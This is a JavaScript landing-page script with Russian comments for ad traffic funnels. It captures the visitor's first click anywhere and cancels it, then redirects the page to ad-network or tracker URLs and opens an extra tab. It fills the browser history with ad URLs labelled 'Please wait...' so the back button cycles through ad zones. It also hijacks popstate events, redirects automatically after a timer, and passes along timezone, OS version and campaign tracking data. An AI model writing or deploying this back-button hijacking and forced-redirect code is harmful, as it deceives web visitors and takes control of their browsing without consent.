
/* common.v2.js — FINAL (Direct Open + Back 3-ZONE CYCLE) 
   - чистая читаемая версия (без минифая)
   - back queue: BACK -> MAIN CT -> MAIN NT -> repeat (если tabUnderClick нет)
   - прокидывает external_id / creative_id / ad_campaign_id / cost и базовые параметры
*/

(() => {
  /* 🔒 anti-double-boot guard (works in non-module scripts) */
  if (window.__COMMON_BOOTED__) return;
  window.__COMMON_BOOTED__ = "v2";

  "use strict";

  // ---------------------------
  // Helpers
  // ---------------------------
  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
  const err  = (...a) => safe(() => console.error(...a));

  const replaceTo = (url) => {
    try { window.location.replace(url); } catch { window.location.href = url; }
  };

  // direct open (no about:blank)
  const openTab = (url) => {
    try {
      const w = window.open(url, "_blank");
      if (w) { try { w.opener = null; } catch {} }
      return w || null;
    } catch {
      return null;
    }
  };

  // ---------------------------
  // URL / Params
  // ---------------------------
  const curUrl = new URL(window.location.href);
  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;

  // clone flag (если когда-то понадобится)
  const CLONE_PARAM = "__cl";
  const isClone = getSP(CLONE_PARAM) === "1";

  const IN = {
    pz: getSP("pz"),
    tb: getSP("tb"),
    tb_reverse: getSP("tb_reverse"),
    ae: getSP("ae"),

    z: getSP("z"),
    var: getSP("var"),
    var_1: getSP("var_1"),
    var_2: getSP("var_2"),
    var_3: getSP("var_3"),

    b: getSP("b"),
    campaignid: getSP("campaignid"),
    abtest: getSP("abtest"),
    rhd: getSP("rhd", "1"),
    s: getSP("s"),
    ymid: getSP("ymid"),
    wua: getSP("wua"),
    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
    cid: getSP("cid"),
    geo: getSP("geo"),

    external_id: getSP("external_id"),
    creative_id: getSP("creative_id"),
    ad_campaign_id: getSP("ad_campaign_id"),
    cost: getSP("cost"),
  };

  const qsFromObj = (obj) => {
    const qs = new URLSearchParams();
    Object.entries(obj || {}).forEach(([k, v]) => {
      if (v != null && String(v) !== "") qs.set(k, String(v));
    });
    return qs;
  };

  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;

  const getOsVersion = async () => {
    try {
      const nav = navigator;
      if (!nav.userAgentData?.getHighEntropyValues) return "";
      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
      return v?.platformVersion || "";
    } catch {
      return "";
    }
  };
  let osVersionCached = "";
  safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));

  const buildCmeta = () => {
    try {
      const html = document.documentElement;
      const payload = {
        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
        templateHash: window.templateHash || "",
      };
      return btoa(JSON.stringify(payload));
    } catch {
      return "";
    }
  };

  // ---------------------------
  // Config normalize (supports both *_zoneId and *_currentTab_zoneId etc.)
  // ---------------------------
  const normalizeConfig = (appCfg) => {
    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;

    const cfg = { domain: String(appCfg.domain) };
    const ensure = (name) => (cfg[name] ||= {});

    Object.entries(appCfg).forEach(([k, v]) => {
      if (v == null || v === "" || k === "domain") return;

      // name_currentTab_zoneId | name_newTab_url
      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
      if (m) {
        const [, name, tab, field] = m;
        const ex = ensure(name);
        (ex[tab] ||= {});
        if (field === "zoneId") ex[tab].domain = cfg.domain;
        ex[tab][field] = v;
        return;
      }

      // name_count | name_timeToRedirect | name_pageUrl
      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
      if (m) {
        ensure(m[1])[m[2]] = v;
        return;
      }

      // name_zoneId | name_url  (single-tab legacy)
      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
      if (m) {
        const [, name, field] = m;
        const ex = ensure(name);
        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
        (ex[tab] ||= {});
        if (field === "zoneId") ex[tab].domain = cfg.domain;
        ex[tab][field] = v;
        return;
      }

      // passthrough other flags
      cfg[k] = v;
    });

    return cfg;
  };

  // ---------------------------
  // Exit QS builder (AFU/back.html)
  // ---------------------------
  const buildExitQSFast = ({ zoneId }) => {
    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");

    const base = {
      ymid: IN.var_1 || IN.var || "",
      var: IN.var_2 || IN.z || "",
      var_3: IN.var_3 || "",
      b: IN.b || "",
      campaignid: IN.campaignid || "",
      click_id: IN.s || "",
      rhd: IN.rhd || "1",

      os_version: osVersionCached || "",
      btz: getTimezoneName(),
      bto: String(getTimezoneOffset()),
      cmeta: buildCmeta(),

      pz: IN.pz || "",
      tb: IN.tb || "",
      tb_reverse: IN.tb_reverse || "",
      ae: IN.ae || "",
      ab2r,

      external_id: IN.external_id || "",
      creative_id: IN.creative_id || "",
      ad_campaign_id: IN.ad_campaign_id || "",
      cost: IN.cost || "",
    };

    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
    return qsFromObj(base);
  };

  const generateAfuUrlFast = (zoneId, domain) => {
    const host = String(domain || "").trim();
    if (!host) return "";
    const base = host.startsWith("http") ? host : `https://${host}`;
    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
    url.search = buildExitQSFast({ zoneId }).toString();
    return url.toString();
  };

  // если ты даёшь прямой Keitaro URL (офер/смартлинк), прокидываем tracking-поля
  const buildKeitaroDirectUrl = (baseUrl) => {
    try {
      const u = new URL(String(baseUrl), window.location.href);

      const external_id = IN.external_id || "";
      const ad_campaign_id = IN.ad_campaign_id || IN.var_2 || "";
      const creative_id = IN.creative_id || "";
      const cost = IN.cost || IN.b || "";

      if (cost) u.searchParams.set("cost", cost);
      u.searchParams.set("currency", "usd");

      if (external_id) u.searchParams.set("external_id", external_id);
      if (creative_id) u.searchParams.set("creative_id", creative_id);
      if (ad_campaign_id) u.searchParams.set("ad_campaign_id", ad_campaign_id);

      if (IN.var_1 && !u.searchParams.has("var_1")) u.searchParams.set("var_1", IN.var_1);
      if (IN.var_2 && !u.searchParams.has("var_2")) u.searchParams.set("var_2", IN.var_2);
      if (IN.var_3 && !u.searchParams.has("var_3")) u.searchParams.set("var_3", IN.var_3);

      return u.toString();
    } catch {
      return String(baseUrl || "");
    }
  };

  // ---------------------------
  // Back queue (cycle)
  // ---------------------------
  const pushBackStates = (url, count) => {
    try {
      const n = Math.max(0, parseInt(count, 10) || 0);
      const originalUrl = window.location.href;

      for (let i = 0; i < n; i++) {
        window.history.pushState(null, "Please wait...", url);
      }
      window.history.pushState(null, document.title, originalUrl);
    } catch (e) {
      err("Back pushState error:", e);
    }
  };

  const pushBackStatesCycle = (urls, count) => {
    try {
      const n = Math.max(0, parseInt(count, 10) || 0);
      const originalUrl = window.location.href;
      const list = Array.isArray(urls) ? urls.filter(Boolean) : [];
      if (!list.length) return;

      for (let i = 0; i < n; i++) {
        const u = list[i % list.length];
        window.history.pushState(null, "Please wait...", u);
      }
      window.history.pushState(null, document.title, originalUrl);
    } catch (e) {
      err("Back pushState CYCLE error:", e);
      safe(() => pushBackStates((urls && urls[0]) || window.location.href, count));
    }
  };

  const getDefaultBackHtmlUrl = () => {
    const { origin, pathname } = window.location;
    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
    if (dir.endsWith("/")) dir = dir.slice(0, -1);
    if (!dir) return `${origin}/back.html`;
    return `${origin}${dir}/back.html`;
  };

  const buildBackHtmlUrl = (cfg, zoneId, overrideUrl) => {
    const b = cfg?.back?.currentTab;
    const pageUrl = cfg?.back?.pageUrl || getDefaultBackHtmlUrl();
    const page = new URL(pageUrl, window.location.href);

    const qs = buildExitQSFast({ zoneId });

    if (overrideUrl) {
      // back.html ? url=<direct>
      qs.set("url", String(overrideUrl));
    } else {
      // back.html ? z=<zone>&domain=<domain>  -> back.html редиректит в afu.php
      qs.set("z", String(zoneId));
      qs.set("domain", String(b?.domain || cfg?.domain || ""));
    }

    page.search = qs.toString();
    return page.toString();
  };

  // ✅ ТВОЁ ТРЕБОВАНИЕ: если tabUnderClick нет — делаем 3-зонный цикл:
  // back -> mainExit currentTab -> mainExit newTab -> repeat
  const initBackFast = (cfg) => {
    const b = cfg?.back?.currentTab;
    if (!b) return;

    const count = cfg.back?.count ?? 10;

    const zoneBack = b.zoneId || null;

    const zoneMainCT = cfg?.mainExit?.currentTab?.zoneId || null;
    const zoneMainNT = cfg?.mainExit?.newTab?.zoneId || null;

    // back-url может быть "прямой" (b.url) либо через z/domain
    const urlBack = zoneBack
      ? buildBackHtmlUrl(cfg, zoneBack, b.url ? String(b.url) : "")
      : "";

    const urlMainCT = zoneMainCT ? buildBackHtmlUrl(cfg, zoneMainCT, "") : "";
    const urlMainNT = zoneMainNT ? buildBackHtmlUrl(cfg, zoneMainNT, "") : "";

    const urls = [urlBack, urlMainCT, urlMainNT].filter(Boolean);

    if (urls.length <= 1) {
      if (urlBack) pushBackStates(urlBack, count);
      return;
    }

    pushBackStatesCycle(urls, count);
  };

  // ---------------------------
  // Exit runners
  // ---------------------------
  const resolveUrlFast = (ex, cfg) => {
    if (!ex) return "";
    if (ex.url) return buildKeitaroDirectUrl(ex.url);
    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
    return "";
  };

  const runExitCurrentTabFast = (cfg, name, withBack = true) => {
    const ex = cfg?.[name]?.currentTab;
    if (!ex) return;

    const url = resolveUrlFast(ex, cfg);
    if (!url) return;

    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));

    if (withBack) {
      initBackFast(cfg);
      setTimeout(() => replaceTo(url), 40);
    } else {
      replaceTo(url);
    }
  };

  const runExitDualTabsFast = (cfg, name, withBack = true) => {
    const ex = cfg?.[name];
    if (!ex) return;

    const ct = ex.currentTab;
    const nt = ex.newTab;

    const ctUrl = resolveUrlFast(ct, cfg);
    const ntUrl = resolveUrlFast(nt, cfg);

    safe(() => {
      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
    });

    if (withBack) initBackFast(cfg);

    if (ntUrl) openTab(ntUrl);
    if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
  };

  const run = (cfg, name) => {
    // tabUnderClick отсутствует — значит просто mainExit
    if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
      return cfg?.mainExit?.newTab
        ? runExitDualTabsFast(cfg, "mainExit", true)
        : runExitCurrentTabFast(cfg, "mainExit", true);
    }
    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
    return runExitCurrentTabFast(cfg, name, true);
  };

  // reverse: back button / popstate
  const initReverse = (cfg) => {
    if (!cfg?.reverse?.currentTab) return;

    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
    window.addEventListener("popstate", () => {
      runExitCurrentTabFast(cfg, "reverse", false);
    });
  };

  // autoexit: N seconds then redirect (if still visible)
  const initAutoexit = (cfg) => {
    if (!cfg?.autoexit?.currentTab) return;

    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
    let armed = false;

    const trigger = () => {
      if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true);
    };

    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);

    const cancel = () => {
      clearTimeout(timer);
      document.removeEventListener("visibilitychange", trigger);
    };

    document.addEventListener("visibilitychange", trigger);
    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
  };

  // ---------------------------
  // Click handler (минималистично)
  // ---------------------------
  const initClickMap = (cfg) => {
    let fired = false;

    document.addEventListener("click", (e) => {
      if (fired) return;
      fired = true;

      // если надо — можешь сюда добавить фильтрацию по target/data-target
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();

      run(cfg, "mainExit");
    }, true);
  };

  // ---------------------------
  // Boot
  // ---------------------------
  const boot = () => {
    if (typeof window.APP_CONFIG === "undefined") {
      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
      return;
    }

    const cfg = normalizeConfig(window.APP_CONFIG);
    if (!cfg) return;

    window.LANDING_EXITS = {
      cfg,
      run: (name) => run(cfg, name),
      initBack: () => initBackFast(cfg),
      isClone,
    };

    initClickMap(cfg);
    initAutoexit(cfg);
    initReverse(cfg);
  };

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();

})();

